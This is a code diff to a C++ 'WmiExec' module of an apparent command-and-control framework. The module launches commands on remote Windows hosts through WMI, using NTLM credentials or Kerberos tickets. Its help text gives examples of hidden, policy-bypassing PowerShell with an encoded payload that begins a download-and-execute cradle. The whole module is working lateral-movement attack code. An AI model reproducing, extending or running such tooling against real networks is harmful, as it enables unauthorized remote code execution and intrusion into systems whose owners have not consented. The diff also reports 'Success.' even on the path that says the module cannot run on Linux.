@@ -52,11 +52,13 @@ std::string WmiExec::getInfo()
 {
 	std::string info;
 	info += "WmiExec:\n";
-	info += "Execute a command through WMI. \n";
-    info += "You must have the right kerberos tickets. \n";
+	info += "Execute a command through Windows Management Instrumentation (WMI). \n";
+    info += "The user have to be administrator of the remote machine. \n";
+    info += "Can be use with credentials or with kerberos authentication. \n";
+    info += "To use with kerberos, the ticket must be in memory (use Rubeus). \n";
 	info += "exemple:\n";
-	info += "- wmiExec m3dc.cyber.local powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc ...\n";
-    info += "- wmiExec 10.9.20.10 powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc ...\n";
+	info += "- wmiExec -u DOMAIN\\Username Password target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV\n";
+    info += "- wmiExec -k DOMAIN\\dc target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV\n";
 
 	return info;
 }
@@ -64,21 +66,92 @@ std::string WmiExec::getInfo()
 
 int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
-   if (splitedCmd.size() >= 3)
+   if (splitedCmd.size() >= 5)
 	{
-		string server = splitedCmd[1];
-        
-        string cmd;
-        for (int idx = 2; idx < splitedCmd.size(); idx++) 
+		string mode = splitedCmd[1];
+
+        if(mode=="-u")
         {
-            if(!cmd.empty())
-                cmd+=" ";
-            cmd+=splitedCmd[idx];
+            string usernameDomain=splitedCmd[2];
+            string password=splitedCmd[3];
+            string target=splitedCmd[4];
+            std::string username="";
+            std::string domain=".";
+
+            std::vector<std::string> splitedList;
+            splitList(usernameDomain, "\\", splitedList);
+
+            if(splitedList.size()==1)
+                username = splitedList[0];
+            else if(splitedList.size()>1)
+            {
+                domain = splitedList[0];
+                username = splitedList[1];
+            }
+
+            std::string cmd = domain;
+            cmd += ";";
+            cmd += username;
+            cmd += ";";
+            cmd += password;
+            cmd += ";";
+            cmd += target;
+
+            c2Message.set_cmd(cmd);
+
+            std::string programToLaunch="";
+            for (int idx = 5; idx < splitedCmd.size(); idx++) 
+            {
+                if(!programToLaunch.empty())
+                    programToLaunch+=" ";
+                programToLaunch+=splitedCmd[idx];
+            }
+
+            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
+        }
+        else if(mode=="-k")
+        {
+            string dcDomain=splitedCmd[2];
+            string target=splitedCmd[3];
+            std::string dc="";
+            std::string domain=".";
+
+            std::vector<std::string> splitedList;
+            splitList(dcDomain, "\\", splitedList);
+
+            if(splitedList.size()==1)
+                dc = splitedList[0];
+            else if(splitedList.size()>1)
+            {
+                domain = splitedList[0];
+                dc = splitedList[1];
+            }
+
+            std::string cmd = domain;
+            cmd += ";";
+            cmd += dc;
+            cmd += ";";
+            cmd += target;
+
+            c2Message.set_cmd(cmd);
+
+            std::string programToLaunch="";
+            for (int idx = 4; idx < splitedCmd.size(); idx++) 
+            {
+                if(!programToLaunch.empty())
+                    programToLaunch+=" ";
+                programToLaunch+=splitedCmd[idx];
+            }
+
+            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
+        }
+        else
+        {
+            c2Message.set_returnvalue(getInfo());
+		    return -1;
         }
 
         c2Message.set_instruction(splitedCmd[0]);
-        c2Message.set_cmd(server);
-        c2Message.set_data(cmd.data(), cmd.size());
 	}
 	else
 	{
@@ -97,30 +170,79 @@ int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 
 // https://learn.microsoft.com/en-us/windows/win32/wmisdk/example--calling-a-provider-method
+// https://vimalshekar.github.io/codesamples/Launching-a-process-on-remote-machine
 int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
-	const std::string cmd = c2Message.cmd();
+	std::string cmd = c2Message.cmd();
 
     std::vector<std::string> splitedList;
     splitList(cmd, ";", splitedList);
+    
+    bool useToken=false;
+    std::string authority="";
 
-    std::string server=splitedList[0];
+    bool useNTLM=false;
+    std::string target="";
+    std::string domainName="";
+    std::string userName="";
+    std::string user="";
+    std::string password="";
+
+    if(splitedList.size()==4)
+    {
+        useNTLM=true;
+        useToken=false;
+
+        domainName=splitedList[0];
+        userName=splitedList[1];
+        password=splitedList[2];
+        target=splitedList[3];
+
+        user=domainName;
+        user+="\\";
+        user+=userName;
+
+    }
+    else if(splitedList.size()==3)
+    {
+        useNTLM=false;
+        useToken=true;
+
+        domainName=splitedList[0];
+        std::string dc=splitedList[1];
+        target=splitedList[2];
+
+        authority="kerberos:";
+        authority+=domainName;
+        authority+="\\";
+        authority+=dc;
+    }
+    else
+    {
+
+    }
+
+
     const std::string data = c2Message.data();
 
     std::string result;
 
 #ifdef _WIN32
 
-    // Execute payload via WMI
     HRESULT hres;
 
     hres =  CoInitializeEx(0, COINIT_MULTITHREADED); 
     if (FAILED(hres)) 
     {
+        _com_error err(hres);
+        LPCTSTR errMsg = err.ErrorMessage();
+
         result += "CoInitializeEx Failed: ";
-        result += std::to_string(GetLastError());
+        result += errMsg;
 
         c2RetMessage.set_instruction(m_name);
+        cmd += " ";
+        cmd += data;
         c2RetMessage.set_cmd(cmd);
         c2RetMessage.set_returnvalue(result);
         return 1;
@@ -132,7 +254,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         NULL,                        // Authentication services
         NULL,                        // Reserved
         RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
-        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
+        RPC_C_IMP_LEVEL_IDENTIFY,    // Default Impersonation  
         NULL,                        // Authentication info
         EOAC_NONE,                   // Additional capabilities 
         NULL                         // Reserved
@@ -140,18 +262,28 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
     if (FAILED(hres)) 
     {
+        _com_error err(hres);
+        LPCTSTR errMsg = err.ErrorMessage();
+        
         result += "CoInitializeSecurity Failed: ";
-        result += std::to_string(GetLastError());
+        result += errMsg;
         CoUninitialize();
 
         c2RetMessage.set_instruction(m_name);
+        cmd += " ";
+        cmd += data;
         c2RetMessage.set_cmd(cmd);
         c2RetMessage.set_returnvalue(result);
         return 1;
     }
     
     IWbemLocator * pLoc = NULL;
-    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *) &pLoc);
+    hres = CoCreateInstance(
+        CLSID_WbemLocator, 
+        0, 
+        CLSCTX_INPROC_SERVER, 
+        IID_IWbemLocator, 
+        (LPVOID *) &pLoc);
  
     if (FAILED(hres)) 
     {
@@ -160,51 +292,96 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         CoUninitialize();
 
         c2RetMessage.set_instruction(m_name);
+        cmd += " ";
+        cmd += data;
         c2RetMessage.set_cmd(cmd);
         c2RetMessage.set_returnvalue(result);
         return 1;
     }
 
     std::string wmiPath="\\\\";
-    wmiPath+=server;
+    wmiPath+=target;
     wmiPath+="\\root\\CIMV2";
 
     IWbemServices * pSvc = NULL;
-    hres = pLoc->ConnectServer(_bstr_t(wmiPath.c_str()), NULL, NULL, 0, NULL, 0, 0, &pSvc);
+    hres = pLoc->ConnectServer(_bstr_t(wmiPath.c_str()), 
+                                _bstr_t(useToken?NULL:user.c_str()),        // User name
+                                _bstr_t(useToken?NULL:password.c_str()),    // Password
+                                NULL,                                       // Locale
+                                0L,                                         // Security flags
+                                _bstr_t(useNTLM?NULL:authority.c_str()),    // Authority, server principal name
+                                0,                                          // WBEM context
+                                &pSvc);                                     // Namespace
 
     if (FAILED(hres)) 
     {
+        _com_error err(hres);
+        LPCTSTR errMsg = err.ErrorMessage();
+
         result += "ConnectServer Failed: ";
-        result += std::to_string(GetLastError());
+        result += errMsg;
         pLoc->Release();     
         CoUninitialize();
 
         c2RetMessage.set_instruction(m_name);
+        cmd += " ";
+        cmd += data;
         c2RetMessage.set_cmd(cmd);
         c2RetMessage.set_returnvalue(result);
         return 1;
     }
 
+    // https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cosetproxyblanket
+    SEC_WINNT_AUTH_IDENTITY_A* pAuthIdentity = NULL;
+
+    if(useNTLM)
+    {
+        pAuthIdentity = new SEC_WINNT_AUTH_IDENTITY_A;
+        ZeroMemory(pAuthIdentity, sizeof(SEC_WINNT_AUTH_IDENTITY_A));
+
+        pAuthIdentity->User = (unsigned char *)userName.data();
+        pAuthIdentity->UserLength = userName.size();
+
+        pAuthIdentity->Domain = (unsigned char *)domainName.data();
+        pAuthIdentity->DomainLength = domainName.size();
+
+        pAuthIdentity->Password = (unsigned char *)password.data();
+        // TODO try with password empty
+        pAuthIdentity->PasswordLength = password.size();
+
+        pAuthIdentity->Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;
+    }
+
     hres = CoSetProxyBlanket(
-        pSvc,                        // Indicates the proxy to set
-        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx 
-        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx 
-        NULL,                        // Server principal name 
-        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
-        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
-        NULL,                        // client identity
-        EOAC_NONE                    // proxy capabilities 
-    );
+        pSvc,                                   // Indicates the proxy to set
+        RPC_C_AUTHN_DEFAULT,                    // RPC_C_AUTHN_xxx 
+        RPC_C_AUTHZ_DEFAULT,                    // RPC_C_AUTHZ_xxx 
+        COLE_DEFAULT_PRINCIPAL,                 // Server principal name 
+        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,          // RPC_C_AUTHN_LEVEL_xxx 
+        RPC_C_IMP_LEVEL_IMPERSONATE,            // RPC_C_IMP_LEVEL_xxx
+        pAuthIdentity,                          // client identity
+        EOAC_NONE                               // proxy capabilities 
+    );    
+
+    if(useNTLM)
+    {
+        delete pAuthIdentity;
+    }
 
     if (FAILED(hres)) 
     {
+        _com_error err(hres);
+        LPCTSTR errMsg = err.ErrorMessage();
+
         result += "CoSetProxyBlanket Failed: ";
-        result += std::to_string(GetLastError());
+        result += errMsg;
         pSvc->Release();
         pLoc->Release();     
         CoUninitialize();
 
         c2RetMessage.set_instruction(m_name);
+        cmd += " ";
+        cmd += data;
         c2RetMessage.set_cmd(cmd);
         c2RetMessage.set_returnvalue(result);
         return 1;
@@ -216,11 +393,68 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
     IWbemClassObject* pClass = NULL;
     hres = pSvc->GetObject(ClassName, 0, NULL, &pClass, NULL);
 
+    if (FAILED(hres)) 
+    {
+        result += "GetObject Failed: ";
+        result += std::to_string((long)(hres)); 
+        pLoc->Release();     
+        CoUninitialize();
+        SysFreeString(ClassName);
+        SysFreeString(MethodName);
+
+        c2RetMessage.set_instruction(m_name);
+        cmd += " ";
+        cmd += data;
+        c2RetMessage.set_cmd(cmd);
+        c2RetMessage.set_returnvalue(result);
+        return 1;
+    }
+
     IWbemClassObject* pInParamsDefinition = NULL;
     hres = pClass->GetMethod(MethodName, 0, &pInParamsDefinition, NULL);
 
+    if (FAILED(hres)) 
+    {
+        _com_error err(hres);
+        LPCTSTR errMsg = err.ErrorMessage();
+
+        result += "GetMethod Failed: ";
+        result += errMsg;
+        pLoc->Release();     
+        CoUninitialize();
+        SysFreeString(ClassName);
+        SysFreeString(MethodName);
+
+        c2RetMessage.set_instruction(m_name);
+        cmd += " ";
+        cmd += data;
+        c2RetMessage.set_cmd(cmd);
+        c2RetMessage.set_returnvalue(result);
+        return 1;
+    }
+
     IWbemClassObject* pClassInstance = NULL;
     hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);
+
+    if (FAILED(hres)) 
+    {
+        _com_error err(hres);
+        LPCTSTR errMsg = err.ErrorMessage();
+
+        result += "SpawnInstance Failed: ";
+        result += errMsg;
+        pLoc->Release();     
+        CoUninitialize();
+        SysFreeString(ClassName);
+        SysFreeString(MethodName);
+
+        c2RetMessage.set_instruction(m_name);
+        cmd += " ";
+        cmd += data;
+        c2RetMessage.set_cmd(cmd);
+        c2RetMessage.set_returnvalue(result);
+        return 1;
+    }
 
     VARIANT varCommand;
     varCommand.vt = VT_BSTR;
@@ -228,13 +462,36 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
     hres = pClassInstance->Put(L"CommandLine", 0, &varCommand, 0);
 
+    if (FAILED(hres)) 
+    {
+        _com_error err(hres);
+        LPCTSTR errMsg = err.ErrorMessage();
+
+        result += "Put Failed: ";
+        result += errMsg;
+        pLoc->Release();     
+        CoUninitialize();
+        SysFreeString(ClassName);
+        SysFreeString(MethodName);
+
+        c2RetMessage.set_instruction(m_name);
+        cmd += " ";
+        cmd += data;
+        c2RetMessage.set_cmd(cmd);
+        c2RetMessage.set_returnvalue(result);
+        return 1;
+    }
+
     IWbemClassObject* pOutParams = NULL;
     hres = pSvc->ExecMethod(ClassName, MethodName, 0, NULL, pClassInstance, &pOutParams, NULL);
 
     if (FAILED(hres))
     {
+        _com_error err(hres);
+        LPCTSTR errMsg = err.ErrorMessage();
+
         result += "CoSetProxyBlanket Failed: ";
-        result += std::to_string(GetLastError());
+        result += errMsg;
 
         VariantClear(&varCommand);
         SysFreeString(ClassName);
@@ -248,6 +505,8 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         CoUninitialize();    
 
         c2RetMessage.set_instruction(m_name);
+        cmd += " ";
+        cmd += data;
         c2RetMessage.set_cmd(cmd);
         c2RetMessage.set_returnvalue(result);
         return 1;
@@ -276,6 +535,11 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
     result += "WmiExec don't work in linux.\n";
 
 #endif
+
+    result += "Success.\n";
+
+    cmd += " ";
+    cmd += data;
 
 	c2RetMessage.set_instruction(m_name);
 	c2RetMessage.set_cmd(cmd);
